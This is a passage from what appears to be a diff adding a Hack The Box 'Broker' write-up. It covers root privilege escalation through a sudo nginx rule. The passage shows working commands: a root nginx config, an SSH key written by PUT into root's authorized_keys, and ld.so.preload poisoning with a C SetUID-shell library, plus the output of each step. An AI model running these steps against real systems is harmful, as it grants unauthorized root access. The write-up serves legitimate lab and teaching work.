+<span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll also need to change the port. I don’t have a way to kill the running server on 1337, and if I try to run with the same port, nginx will fail to listen and abort.</p>
+<p>Now I run this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/dev/shm$</span><span class="w"> </span><span class="nb">sudo</span> /usr/sbin/nginx <span class="nt">-c</span> /dev/shm/0xdf.conf 
+</code></pre></div></div>
+<p>And a new server is listening on 1338, returning a file listing for <code class="language-plaintext highlighter-rouge">/</code>:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/dev/shm$</span><span class="w"> </span>curl localhost:1338
+<span class="go">&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Index of /&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Index of /&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href="../"&gt;../&lt;/a&gt;
+&lt;a href="bin/"&gt;bin/&lt;/a&gt;                                               06-Nov-2023 01:10                   -
+&lt;a href="boot/"&gt;boot/&lt;/a&gt;                                              06-Nov-2023 01:38                   -
+&lt;a href="dev/"&gt;dev/&lt;/a&gt;                                               08-Nov-2023 17:53                   -
+&lt;a href="etc/"&gt;etc/&lt;/a&gt;                                               07-Nov-2023 06:53                   -
+&lt;a href="home/"&gt;home/&lt;/a&gt;                                              06-Nov-2023 01:18                   -
+&lt;a href="lib/"&gt;lib/&lt;/a&gt;                                               06-Nov-2023 00:57                   -
+&lt;a href="lib32/"&gt;lib32/&lt;/a&gt;                                             17-Feb-2023 17:19                   -
+&lt;a href="lib64/"&gt;lib64/&lt;/a&gt;                                             05-Nov-2023 02:36                   -
+&lt;a href="libx32/"&gt;libx32/&lt;/a&gt;                                            17-Feb-2023 17:19                   -
+&lt;a href="lost%2Bfound/"&gt;lost+found/&lt;/a&gt;                                        27-Apr-2023 15:40                   -
+&lt;a href="media/"&gt;media/&lt;/a&gt;                                             06-Nov-2023 01:18                   -
+&lt;a href="mnt/"&gt;mnt/&lt;/a&gt;                                               17-Feb-2023 17:19                   -
+&lt;a href="opt/"&gt;opt/&lt;/a&gt;                                               06-Nov-2023 01:18                   -
+&lt;a href="proc/"&gt;proc/&lt;/a&gt;                                              08-Nov-2023 17:53                   -
+&lt;a href="root/"&gt;root/&lt;/a&gt;                                              07-Nov-2023 08:40                   -
+&lt;a href="run/"&gt;run/&lt;/a&gt;                                               08-Nov-2023 19:24                   -
+&lt;a href="sbin/"&gt;sbin/&lt;/a&gt;                                              06-Nov-2023 01:10                   -
+&lt;a href="srv/"&gt;srv/&lt;/a&gt;                                               06-Nov-2023 01:18                   -
+&lt;a href="sys/"&gt;sys/&lt;/a&gt;                                               08-Nov-2023 17:53                   -
+&lt;a href="tmp/"&gt;tmp/&lt;/a&gt;                                               08-Nov-2023 20:00                   -
+&lt;a href="usr/"&gt;usr/&lt;/a&gt;                                               17-Feb-2023 17:19                   -
+&lt;a href="var/"&gt;var/&lt;/a&gt;                                               05-Nov-2023 01:43                   -
+&lt;a href="test.out"&gt;test.out&lt;/a&gt;                                           08-Nov-2023 19:22                  14
+&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>If I use a PUT request instead, it’ll write what I send to the file:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/dev/shm$</span><span class="w"> </span>curl <span class="nt">-X</span> PUT localhost:1338/root/.ssh/authorized_keys <span class="nt">-d</span> <span class="s1">'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing'</span>
+</code></pre></div></div>
+<p>So this writes my public SSH key to root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+<p>Now I can SSH as root to Broker:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@10.10.11.243
+<span class="go">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+...[snip]...
+</span><span class="gp">root@broker:~#</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="load-so-alternative">Load SO [Alternative]</h3>
+<h4 id="background">Background</h4>
+<p>The author of this box modeled this part of the box after a a Zimbra vulnerability, <a href="https://github.com/advisories/GHSA-w7p3-hmmp-qmx6">CVE-2022-41347</a>. The issue is that this version of Zimbra left the zimbra user with the ability to run <code class="language-plaintext highlighter-rouge">sudo nginx</code>. The researcher who identified this vulnerability walks through it all in <a href="https://darrenmartynie.wordpress.com/2021/10/25/zimbra-nginx-local-root-exploit/">this post</a>. They show file read the same way I did, but to get a shell, they took a different path, which is interesting.</p>
+<p>They create a nginx webserver running as root with the error log configured to overwrite the <code class="language-plaintext highlighter-rouge">ld.so.preload</code> file. From the <code class="language-plaintext highlighter-rouge">ld</code> <a href="https://linux.die.net/man/8/ld.so">man page</a>:</p>
+<blockquote>
+<p><code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>
+File containing a whitespace-separated list of ELF shared libraries to be loaded before the program.</p>
+</blockquote>
+<p>So if I can then trigger an error message that includes the full path of a malicious library to include, that will be written into the file. Then any program executed will try to load that library (and a bunch of things that aren’t libraries, but that’s ok).</p>
+<p>The steps the researcher lays out are as follows, and work with some modification:</p>
+<blockquote>
+<ol>
+<li>Drop a <code class="language-plaintext highlighter-rouge">setuid(0);execve("/bin/sh"...)</code> rootshell to disk.</li>
+<li>Drop a library containing a constructor that does chown/chmod on said rootshell binary, along with unlinking <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>.</li>
+<li>Write an nginx config that runs as root, and has the error log set to <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>.</li>
+<li>Run nginx with our config file, using sudo.</li>
+<li>Request a URL containing some whitespace, and the path to our library file a couple of times. This will ensure that the string containing our library-path gets written out to the error log.</li>
+<li>Call sudo, or any setuid binary really, to trigger some library loading as root and get our root shell created.</li>
+<li>Run our root shell.</li>
+</ol>
+</blockquote>
+<p>I’ll shorten this a bit:</p>
+<ol>
+<li>Start an nginx server that runs as root, and has the error log set to <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>.</li>
+<li>Request a URL that doesn’t exist that has the path <code class="language-plaintext highlighter-rouge">/tmp/pwn.so</code> so that that path gets into the <code class="language-plaintext highlighter-rouge">ld.so.preload</code> file.</li>
+<li>Create shared object to set <code class="language-plaintext highlighter-rouge">bash</code> SetUID / SetGID.</li>
+<li>Run <code class="language-plaintext highlighter-rouge">sudo -l</code> to trigger <code class="language-plaintext highlighter-rouge">pwn.so</code>.</li>
+</ol>
+<h4 id="start-nginx">Start nginx</h4>
+<p>The nginx config looks a lot like before, but this time with an <code class="language-plaintext highlighter-rouge">error_log</code> defined (and a new port since nginx is still listening on others):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span> <span class="n">root</span><span class="p">;</span>
+<span class="n">error_log</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ld</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">preload</span> <span class="n">warn</span><span class="p">;</span>
+<span class="n">events</span> <span class="p">{</span>
+    <span class="n">worker_connections</span> <span class="mi">1024</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">http</span> <span class="p">{</span>
+    <span class="n">server</span> <span class="p">{</span>
+        <span class="n">listen</span> <span class="mi">1339</span><span class="p">;</span>
+        <span class="n">root</span> <span class="o">/</span><span class="p">;</span>
+        <span class="n">autoindex</span> <span class="n">on</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll start that nginx server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> /usr/sbin/nginx <span class="nt">-c</span> /tmp/nginx.conf 
+<span class="gp">activemq@broker:/tmp$</span><span class="w"> </span>netstat <span class="nt">-tnlp</span> | <span class="nb">grep </span>1339
+<span class="go">tcp        0      0 0.0.0.0:1339            0.0.0.0:*               LISTEN      - 
+</span></code></pre></div></div>
+<p>Now there’s a server listening on 1339 that writes error logs to <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>.</p>
+<h4 id="poison-ldsopreload">Poison ld.so.preload</h4>
+<p>Now I’ll request <code class="language-plaintext highlighter-rouge">/tmp/pwn.so</code>. The first request looks like a normal 404:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span>curl localhost:1339/tmp/pwn.so
+<span class="go">&lt;html&gt;
+&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>It’s important that the library not exist yet, or it won’t error and thus won’t write the log. If I run <code class="language-plaintext highlighter-rouge">curl</code> again, I’ll see errors:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span>curl localhost:1339/tmp/pwn.so
+<span class="go">ERROR: ld.so: object '2023/11/08' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '21' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '13' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '40' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '[error]' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '2426' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>That’s because <code class="language-plaintext highlighter-rouge">curl</code> is trying to load a bunch of things as shared objects from <code class="language-plaintext highlighter-rouge">ld.so.preload</code> that aren’t shared objects. This is clear in <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="400"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span><span class="nb">cat</span> /etc/ld.so.preload 
+<span class="go">ERROR: ld.so: object '2023/11/08' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '21' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '13' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '40' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '[error]' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '2426' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '2023/11/08' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '21' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '13' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '42' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '[error]' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '2426#2426' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '*2' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'open()' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '"/tmp/pwn.so"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'failed' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '(2' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'No' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'such' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'file' from /etc/ld.so.preload cannot be preloaded (cannot read file data): ignored.
+ERROR: ld.so: object 'or' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'directory),' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'client' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '127.0.0.1,' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'server' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object ',' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'request' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '"GET' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '/tmp/pwn.so' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'HTTP/1.1",' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object 'host' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '"localhost' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '1339"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+
+2023/11/08 21:13:40 [error] 2426#2426: *1 open() "/tmp/pwn.so" failed (2: No such file or directory), client: 127.0.0.1, server: , request: "GET /tmp/pwn.so HTTP/1.1", host: "localhost:1339"
+2023/11/08 21:13:42 [error] 2426#2426: *2 open() "/tmp/pwn.so" failed (2: No such file or directory), client: 127.0.0.1, server: , request: "GET /tmp/pwn.so HTTP/1.1", host: "localhost:1339"
+</span></code></pre></div></div>
+<p>Now any command will try to load a bunch of junk, but also <code class="language-plaintext highlighter-rouge">/tmp/pwn.so</code>.</p>
+<h4 id="create-so">Create SO</h4>
+<p>I’ll make a copy of <code class="language-plaintext highlighter-rouge">bash</code> to mess with:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$ </span><span class="nb">cp</span> /bin/bash /tmp/rootshell
+<span class="go">...[snip errors]...
+</span></code></pre></div></div>
+<p>I’ll write the following to <code class="language-plaintext highlighter-rouge">/tmp/pwn.c</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
+<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+   <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+   <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span> 
+   <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
+   <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This will be the shared library, and on being loaded, it will change the <code class="language-plaintext highlighter-rouge">bash</code> executable I just copied to be owned by root and have the SetUID bit on. Compiling this throws a warning, but it makes the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> /tmp/pwn.so pwn.c 
+<span class="go">...[snip errors]...
+pwn.c: In function ‘dropshell’:
+pwn.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
+   7 |     chmod("/tmp/rootshell", 04755);
+     |     ^~~~~
+</span><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">...[snip errors]...
+pwn.c  pwn.so  rootshell
+</span></code></pre></div></div>
+<h4 id="run-setuid-binary">Run SetUID Binary</h4>
+<p>Now I just need to run something that starts as root. <code class="language-plaintext highlighter-rouge">sudo -l</code> will work nicely:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">ERROR: ld.so: object '2023/11/08' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '21' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+...[snip]...
+ERROR: ld.so: object '1339"' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+</span></code></pre></div></div>
+<p>It fails to load a bunch of shared objects, but if it loaded <code class="language-plaintext highlighter-rouge">pwn.so</code>, then <code class="language-plaintext highlighter-rouge">/tmp/rootshell</code> should be SetUID and SetGID now. It is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/rootshell 
+<span class="go">-rwsr-xr-x 1 root root 1396520 Nov  8 21:07 /tmp/rootshell
+</span></code></pre></div></div>
+<p>Running it with <code class="language-plaintext highlighter-rouge">-p</code> returns a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/tmp$</span><span class="w"> </span>/tmp/rootshell <span class="nt">-p</span>
+<span class="gp">rootshell-5.1#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000(activemq) gid=1000(activemq) euid=0(root) groups=1000(activemq)
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/11/09/htb-broker.html"></a>
+</article>
